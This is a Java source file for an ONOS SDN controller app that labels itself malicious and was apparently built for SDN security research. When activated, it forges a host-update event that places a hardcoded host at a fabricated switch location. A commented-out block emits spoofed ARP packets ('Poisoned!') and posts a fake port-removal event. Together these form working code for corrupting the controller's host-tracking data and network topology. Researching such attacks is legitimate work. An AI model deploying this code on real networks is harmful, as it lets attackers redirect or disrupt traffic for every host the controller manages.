/*
 * Copyright 2023-present Open Networking Foundation
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 * 
 * @author edoardottt, https://edoardottt.com/
 */

package org.onosproject.eventhosttracking.app;

import org.osgi.service.component.annotations.Activate;
import org.osgi.service.component.annotations.Component;
import org.osgi.service.component.annotations.Deactivate;
import org.osgi.service.component.annotations.Reference;
import org.osgi.service.component.annotations.ReferenceCardinality;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.onosproject.core.CoreService;
import org.onosproject.net.DefaultAnnotations;
import org.onosproject.net.device.DeviceService;
import org.onosproject.net.Device;
import org.onosproject.net.host.HostService;
import org.onosproject.net.host.HostStore;
import org.onosproject.net.host.HostEvent;
import org.onosproject.net.Host;
import org.onosproject.net.HostId;
import org.onosproject.net.HostLocation;
import org.onosproject.net.DeviceId;
import org.onosproject.core.ApplicationId;
import org.onosproject.net.device.DeviceStore;
import org.onosproject.net.Port;
import org.onosproject.net.PortNumber;
import org.onosproject.event.EventDeliveryService;
import org.onosproject.net.device.DeviceEvent;
import org.onosproject.event.Event;
import org.onlab.packet.IpAddress;
import org.onosproject.net.packet.PacketEvent;
import org.onosproject.net.packet.DefaultOutboundPacket;
import org.onosproject.net.flow.TrafficTreatment;
import org.onosproject.net.flow.DefaultTrafficTreatment.Builder;
import org.onosproject.net.flow.DefaultTrafficTreatment;
import org.onlab.packet.ARP;
import org.onlab.packet.Ethernet;
import java.nio.ByteBuffer;
import java.util.Timer;
import org.onosproject.net.DefaultHost;
import org.onosproject.net.packet.PacketService;
import java.util.Random;
import java.util.ArrayList;
import java.util.List;
import java.io.StringWriter;
import java.io.PrintWriter;
import org.onlab.packet.VlanId;
import org.onlab.packet.MacAddress;
import org.onosproject.net.provider.ProviderId;
import java.util.Set;
import java.util.HashSet;
import java.util.TimerTask;

/**
 * Malicious Event based Host Tracking Application.
 */
@Component(immediate = true)
public class EventHostTracking {

    private final Logger log = LoggerFactory.getLogger(getClass());

    @Reference(cardinality = ReferenceCardinality.MANDATORY)
    protected CoreService coreService;

    @Reference(cardinality = ReferenceCardinality.MANDATORY)
    protected DeviceService deviceService;

    @Reference(cardinality = ReferenceCardinality.MANDATORY)
    protected DeviceStore deviceStore;

    @Reference(cardinality = ReferenceCardinality.MANDATORY)
    protected PacketService packetService;

    @Reference(cardinality = ReferenceCardinality.MANDATORY)
    protected HostService hostService;

    @Reference(cardinality = ReferenceCardinality.MANDATORY)
    protected EventDeliveryService eventDispatcher;

    Timer timer = new Timer();
    TimerTask timerTask = new TimerTask() {
        @Override
        public void run() {
            log.info("Time up, running Task!");
            editHostStore();
        }
    };

    // --------------------------------------------------------
    // CHANGE THIS PARAMETER TO TRIGGER THE APP EVERY X MILLISECONDS.
    // --------------------------------------------------------
    private static final long TIMEOUT = 10000;

    @Activate
    protected void activate() {
        coreService.registerApplication("org.edoardottt.eventhosttracking.app", () -> log.info("Periscope down."));
        // startTimer(TIMEOUT);
        editHostStore();
        log.info("Started eventhosttracking App!");
    }

    @Deactivate
    protected void deactivate() {
        // timer.cancel();
        // timer.purge();
        log.info("Stopped eventhosttracking App!");
    }

    // editHostStore mess up with the Host Data Store.
    private void editHostStore() {
        /*
         * try {
         * Device d = pickRandomDevice();
         * 
         * log.info("Malicious Event based Host Tracking App: Selected device {}",
         * d.id());
         * 
         * List<Port> ports = deviceStore.getPorts(d.id());
         * Port port = ports.get(1);
         * Set<Host> hosts = hostService.getConnectedHosts(d.id());
         * Host h = hosts.iterator().next();
         * 
         * log.info("Malicious Event based Host Tracking App: Selected port {}",
         * port.number());
         * 
         * Device d2 = null;
         * while (d2 == null || d2 == d) {
         * d2 = pickRandomDevice();
         * }
         * List<Port> ports2 = deviceStore.getPorts(d2.id());
         * Port attackerPort = ports2.get(2);
         * Set<Host> hosts2 = hostService.getConnectedHosts(d2.id());
         * Host h2 = hosts.iterator().next();
         * TrafficTreatment treatment = DefaultTrafficTreatment.emptyTreatment();
         * Ethernet et = ARP.buildArpRequest(h.mac().toBytes(),
         * h.ipAddresses().iterator().next().toOctets(),
         * h2.ipAddresses().iterator().next().toOctets(), (short)1);
         * DefaultOutboundPacket op = new DefaultOutboundPacket(d2.id(), treatment,
         * ByteBuffer.wrap(et.serialize()), attackerPort.number());
         * packetService.emit(op);
         * 
         * log.info("Malicious Event based Host Tracking App: {} : {} Poisoned!",
         * d2.id(), attackerPort.number());
         * 
         * DeviceEvent e = new DeviceEvent(DeviceEvent.Type.PORT_REMOVED, d, port);
         * eventDispatcher.post(e);
         * 
         * log.info("Malicious Event based Host Tracking App: {} : {} Location Removed!"
         * , d.id(), port.number());
         * 
         * } catch (Exception e) {
         * StringWriter sw = new StringWriter();
         * PrintWriter pw = new PrintWriter(sw);
         * e.printStackTrace(pw);
         * log.info(sw.toString());
         * }
         */

        HostId hostId = HostId.hostId("00:00:00:00:00:03/None");
        MacAddress macAddress = MacAddress.valueOf("00:00:00:00:00:03");
        DeviceId deviceId = DeviceId.deviceId("of:0000000000000004");
        PortNumber portNumber = PortNumber.portNumber((long) 1);
        HostLocation location = new HostLocation(deviceId, portNumber, (long) 1);
        IpAddress ip = IpAddress.valueOf("10.0.0.3");
        Set<IpAddress> ips = new HashSet<IpAddress>();
        ips.add(ip);
        DefaultAnnotations annotations = DefaultAnnotations.builder().build();

        Host h = new DefaultHost(ProviderId.NONE, hostId, macAddress, VlanId.NONE, location, ips, annotations);

        HostEvent e = new HostEvent(HostEvent.Type.HOST_UPDATED, h);

        eventDispatcher.post(e);

        log.info(e.toString());
    }

    // startTimer starts a timer that timeouts every X seconds.
    private void startTimer(long timeout) {
        timer.scheduleAtFixedRate(timerTask, 0, timeout);
    }

    // pickRandomDevice picks a random device
    private Device pickRandomDevice() {
        Iterable<Device> devices = deviceService.getDevices();
        Random rand = new Random();
        List<Device> deviceList = new ArrayList<Device>();
        devices.forEach(deviceList::add);
        Device randomDevice = deviceList.get(rand.nextInt(deviceList.size()));

        return randomDevice;
    }

    // pickRandomPort picks a random port of a device
    private Port pickRandomPort(List<Port> ports) {
        Random rand = new Random();
        Port randomPort = ports.get(rand.nextInt(ports.size()));
        while (randomPort.number() == PortNumber.LOCAL) {
            randomPort = ports.get(rand.nextInt(ports.size()));
        }

        return randomPort;
    }

    // getHost picks a random host
    private Host getHost(int i) {
        Iterable<Host> hosts = hostService.getHosts();
        Random rand = new Random();
        List<Host> hostList = new ArrayList<Host>();
        hosts.forEach(hostList::add);
        Host randomHost = hostList.get(i);

        return randomHost;
    }
}
